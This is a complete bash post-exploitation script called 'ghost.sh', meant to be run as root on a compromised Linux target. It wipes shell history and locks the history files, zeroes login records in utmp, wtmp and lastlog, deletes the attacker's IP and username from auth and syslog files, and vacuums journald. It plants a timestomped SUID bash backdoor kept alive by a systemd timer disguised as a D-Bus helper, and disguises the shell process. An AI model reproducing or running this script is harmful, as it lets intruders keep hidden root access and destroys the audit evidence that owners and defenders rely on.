#!/bin/bash
# ghost.sh - Session & Artifact Concealment
# Run as root on target

RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
BLU='\033[0;34m'
CYN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

ok()   { echo -e "${GRN}[+]${NC} $1"; }
info() { echo -e "${BLU}[*]${NC} $1"; }
warn() { echo -e "${YLW}[!]${NC} $1"; }
fail() { echo -e "${RED}[-]${NC} $1"; }
head() { echo -e "\n${BOLD}${CYN}=== $1 ===${NC}"; }

# ─────────────────────────────────────────────
# CONFIG - edit before running
# ─────────────────────────────────────────────
TARGET_USER="${SUDO_USER:-$(logname 2>/dev/null || echo $USER)}"
MY_PTS=$(tty 2>/dev/null | sed 's|/dev/||')          # e.g. pts/0
MY_IP=$(echo $SSH_CLIENT | awk '{print $1}')           # attacker IP
SUID_PATH="/var/tmp/.dbus-daemon-launch"               # SUID binary location
SUID_NAME="[kworker/2:1H]"                             # process disguise name
# ─────────────────────────────────────────────

echo -e "${BOLD}${RED}"
cat << 'BANNER'
 ▄▄ •  ▄ .▄      .▄▄ · ▄▄▄▄▄   .▄▄ ·  ▄ .▄
▐█ ▀ ▪██▪▐█▪     ▐█ ▀. •██     ▐█ ▀. ██▪▐█
▄█ ▀█▄██▀▐█ ▄█▀▄ ▄▀▀▀█▄ ▐█.▪   ▄▀▀▀█▄██▀▐█
▐█▄▪▐███▌▐▀▐█▌.▐▌▐█▄▪▐█ ▐█▌·   ▐█▄▪▐███▌▐▀
·▀▀▀▀ ▀▀▀ · ▀█▄▀▪ ▀▀▀▀  ▀▀▀  ▀  ▀▀▀▀ ▀▀▀ ·
								ghost.sh
BANNER
echo -e "${NC}"

if [[ $EUID -ne 0 ]]; then
    fail "Must be run as root"
    exit 1
fi

info "Target user  : $TARGET_USER"
info "Current PTY  : $MY_PTS"
info "SSH client IP: ${MY_IP:-not detected}"
echo ""

# ─────────────────────────────────────────────
head "1. SUPPRESS HISTORY"
# ─────────────────────────────────────────────

# Nuke history for current session
unset HISTFILE HISTSIZE HISTFILESIZE
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
history -c 2>/dev/null

# Nuke saved history files for target user
for HFILE in \
    /root/.bash_history \
    /root/.zsh_history \
    /home/$TARGET_USER/.bash_history \
    /home/$TARGET_USER/.zsh_history; do
    if [[ -f "$HFILE" ]]; then
        cat /dev/null > "$HFILE"
        chattr +i "$HFILE" 2>/dev/null  # make immutable so bash can't write to it
        ok "Cleared & locked $HFILE"
    fi
done

# Patch bashrc to always discard history for this user
BASHRC="/home/$TARGET_USER/.bashrc"
if [[ -f "$BASHRC" ]] && ! grep -q 'HISTFILE=/dev/null' "$BASHRC"; then
    echo -e '\n# system audit suppression\nunset HISTFILE HISTSIZE HISTFILESIZE\nexport HISTFILE=/dev/null' >> "$BASHRC"
    ok "Patched $BASHRC to disable history"
fi

# ─────────────────────────────────────────────
head "2. WIPE UTMP (who / w)"
# ─────────────────────────────────────────────

# /var/run is often a symlink to /run, but check both explicitly
UTMP=""
for _p in /run/utmp /var/run/utmp /run/utmp.db; do
    [[ -f "$_p" ]] && UTMP="$_p" && break
done
if [[ -n "$UTMP" ]]; then
    ok "Found utmp at $UTMP"
    python3 - "$UTMP" "$MY_PTS" "$TARGET_USER" "$MY_IP" << 'PYEOF'
import sys

utmp_file   = sys.argv[1]
pts         = sys.argv[2].encode() if sys.argv[2] else b''
target_user = sys.argv[3].encode() if sys.argv[3] else b''
my_ip       = sys.argv[4].encode() if sys.argv[4] else b''
REC_SIZE    = 384

wiped = 0
try:
    with open(utmp_file, 'r+b') as f:
        data = f.read()
        offset = 0
        while offset + REC_SIZE <= len(data):
            chunk = data[offset:offset + REC_SIZE]
            hit = False
            if pts         and pts         in chunk: hit = True
            if target_user and target_user in chunk: hit = True
            if my_ip       and my_ip       in chunk: hit = True
            if hit:
                f.seek(offset)
                f.write(b'\x00' * REC_SIZE)
                wiped += 1
            offset += REC_SIZE
    print(f"[+] Wiped {wiped} utmp record(s)")
except Exception as e:
    print(f"[-] utmp error: {e}")
PYEOF
else
    warn "utmp not found at /run/utmp or /var/run/utmp"
fi

# ─────────────────────────────────────────────
head "3. WIPE WTMP (last)"
# ─────────────────────────────────────────────

WTMP="/var/log/wtmp"
if [[ -f "$WTMP" ]]; then
    python3 - "$WTMP" "$TARGET_USER" "$MY_IP" "$MY_PTS" << 'PYEOF'
import sys, os

wtmp_file   = sys.argv[1]
target_user = sys.argv[2].encode()
my_ip       = sys.argv[3].encode() if sys.argv[3] else b''
my_pts      = sys.argv[4].encode() if sys.argv[4] else b''
REC_SIZE    = 384

with open(wtmp_file, 'r+b') as f:
    data  = f.read()
    offset = 0
    wiped  = 0
    while offset + REC_SIZE <= len(data):
        chunk = data[offset:offset + REC_SIZE]
        hit = False
        if target_user and target_user in chunk: hit = True
        if my_ip       and my_ip       in chunk: hit = True
        if my_pts      and my_pts      in chunk: hit = True
        if hit:
            f.seek(offset)
            f.write(b'\x00' * REC_SIZE)
            wiped += 1
        offset += REC_SIZE

print(f"[+] Wiped {wiped} wtmp record(s)")
PYEOF
    ok "wtmp cleaned"
else
    warn "/var/log/wtmp not found"
fi

# ─────────────────────────────────────────────
head "4. WIPE LASTLOG"
# ─────────────────────────────────────────────

LASTLOG="/var/log/lastlog"
if [[ -f "$LASTLOG" ]]; then
    python3 - "$LASTLOG" "$TARGET_USER" << 'PYEOF'
import sys, pwd

lastlog_file = sys.argv[1]
username     = sys.argv[2]
REC_SIZE     = 292

try:
    uid = pwd.getpwnam(username).pw_uid
    with open(lastlog_file, 'r+b') as f:
        f.seek(uid * REC_SIZE)
        f.write(b'\x00' * REC_SIZE)
    print(f"[+] Cleared lastlog for {username} (uid={uid})")
except KeyError:
    print(f"[-] User {username} not found in passwd")
except Exception as e:
    print(f"[-] lastlog error: {e}")
PYEOF
else
    warn "/var/log/lastlog not found (may use wtmpdb on this system)"
    # Handle wtmpdb (systemd-based systems like Debian Bookworm+)
    if command -v wtmpdb &>/dev/null; then
        warn "wtmpdb detected - entries may persist in /var/log/wtmp.db"
    fi
fi

# ─────────────────────────────────────────────
head "5. SCRUB AUTH.LOG / SYSLOG"
# ─────────────────────────────────────────────

PATTERNS=()
[[ -n "$TARGET_USER" ]] && PATTERNS+=("$TARGET_USER")
[[ -n "$MY_IP"       ]] && PATTERNS+=("$MY_IP")

LOGFILES=(
    /var/log/auth.log
    /var/log/auth.log.1
    /var/log/syslog
    /var/log/secure
    /var/log/messages
    /var/log/ssh/auth.log
)

for LOGF in "${LOGFILES[@]}"; do
    if [[ -f "$LOGF" ]]; then
        for PAT in "${PATTERNS[@]}"; do
            COUNT=$(grep -c "$PAT" "$LOGF" 2>/dev/null | tr -d '[:space:]')
            COUNT=${COUNT:-0}
            if [[ "$COUNT" =~ ^[0-9]+$ ]] && [[ "$COUNT" -gt 0 ]]; then
                sed -i "/${PAT//\//\\/}/d" "$LOGF"
                ok "Removed $COUNT lines matching '$PAT' from $LOGF"
            fi
        done
    fi
done

# Also stop rsyslog/journald from logging our actions temporarily
# (don't permanently disable - too obvious)
# Flush journald so scraped lines are gone
journalctl --rotate 2>/dev/null
journalctl --vacuum-time=1s 2>/dev/null && ok "Journald vacuumed" || warn "journalctl vacuum failed (non-fatal)"

# ─────────────────────────────────────────────
head "6. DROP SUID BINARY"
# ─────────────────────────────────────────────

cp /bin/bash "$SUID_PATH"
chmod 4755 "$SUID_PATH"
touch -r /bin/bash "$SUID_PATH"        # timestomp to match /bin/bash mtime
chown root:root "$SUID_PATH"
ok "SUID binary planted at $SUID_PATH"
ok "Timestomped to match /bin/bash"
info "Escalate later with: $SUID_PATH -p"

# ─────────────────────────────────────────────
head "7. SYSTEMD TIMER - RECREATE SUID BINARY HOURLY"
# ─────────────────────────────────────────────

cat > /etc/systemd/system/dbus-launch-helper.service << SVCEOF
[Unit]
Description=D-Bus Session Launch Helper
After=dbus.service
Requires=dbus.service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash ${SUID_PATH}; chmod 4755 ${SUID_PATH}; touch -r /bin/bash ${SUID_PATH}'
StandardOutput=null
StandardError=null
SVCEOF

cat > /etc/systemd/system/dbus-launch-helper.timer << TMREOF
[Unit]
Description=D-Bus Session Helper Timer
Requires=dbus-launch-helper.service

[Timer]
OnBootSec=60sec
OnUnitActiveSec=1h
AccuracySec=5min
Persistent=true

[Install]
WantedBy=timers.target
TMREOF

systemctl daemon-reload 2>/dev/null
systemctl enable dbus-launch-helper.timer --now 2>/dev/null \
    && ok "Systemd timer enabled (hourly SUID recreation)" \
    || warn "Systemd timer setup failed"

# Timestomp the service files too
touch -r /etc/systemd/system/dbus.service \
    /etc/systemd/system/dbus-launch-helper.service \
    /etc/systemd/system/dbus-launch-helper.timer 2>/dev/null
ok "Timestomped systemd unit files"

# ─────────────────────────────────────────────
head "8. SSH AUTHORIZED_KEY PERSISTENCE"
# ─────────────────────────────────────────────

warn "Skipping SSH key persistence - provide your public key manually:"
info "  echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"
info "  chmod 600 /root/.ssh/authorized_keys"

# ─────────────────────────────────────────────
head "9. HIDE CURRENT PROCESS"
# ─────────────────────────────────────────────

# Rename current shell in proc (cosmetic but helps)
if [[ -w /proc/$$/comm ]]; then
    echo "$SUID_NAME" > /proc/$$/comm 2>/dev/null \
        && ok "Renamed shell process to '$SUID_NAME' in /proc" \
        || warn "Could not rename process"
fi

# ─────────────────────────────────────────────
head "10. VERIFICATION"
# ─────────────────────────────────────────────

echo ""
info "Running verification checks..."
echo ""

# Check we're hidden from w/who
W_CHECK=$(w 2>/dev/null | grep -c "$TARGET_USER" 2>/dev/null | tr -d '[:space:]')
W_CHECK=${W_CHECK:-0}
if [[ "$W_CHECK" =~ ^[0-9]+$ ]] && [[ "$W_CHECK" -eq 0 ]]; then
    ok "Not visible in 'w' output"
else
    warn "Still visible in 'w' output ($W_CHECK entries) - utmp wipe may need manual pts"
fi

# Check SUID binary
if [[ -u "$SUID_PATH" ]]; then
    ok "SUID binary confirmed at $SUID_PATH"
    ls -la "$SUID_PATH"
else
    fail "SUID binary NOT found or missing setuid bit"
fi

# Check timer
if systemctl is-enabled dbus-launch-helper.timer &>/dev/null; then
    ok "Systemd timer is enabled"
else
    warn "Systemd timer not confirmed"
fi

# Check auth.log
if [[ -n "$MY_IP" ]]; then
    AUTH_HITS=$(grep -c "$MY_IP" /var/log/auth.log 2>/dev/null | tr -d '[:space:]')
    AUTH_HITS=${AUTH_HITS:-0}
    if [[ "$AUTH_HITS" =~ ^[0-9]+$ ]] && [[ "$AUTH_HITS" -eq 0 ]]; then
        ok "IP $MY_IP not found in auth.log"
    else
        warn "$AUTH_HITS references to $MY_IP still in auth.log"
    fi
fi

# ─────────────────────────────────────────────
echo ""
echo -e "${BOLD}${GRN}=== GHOST COMPLETE ===${NC}"
echo ""
echo -e "${CYN}Summary:${NC}"
echo -e "  SUID shell    : ${YLW}$SUID_PATH -p${NC}"
echo -e "  Timer         : ${YLW}systemctl status dbus-launch-helper.timer${NC}"
echo -e "  Stay hidden   : ${YLW}ssh -T user@host 'unset HISTFILE; exec bash -i'${NC}"
echo ""
echo -e "${RED}[!] Remember: wtmpdb (/var/log/wtmp.db) on this system may${NC}"
echo -e "${RED}    persist entries sqlite3 can't be wiped by log scrubbing.${NC}"
echo -e "${RED}    Run: sqlite3 /var/log/wtmp.db 'DELETE FROM wtmp WHERE user=\"$TARGET_USER\";'${NC}"
echo ""
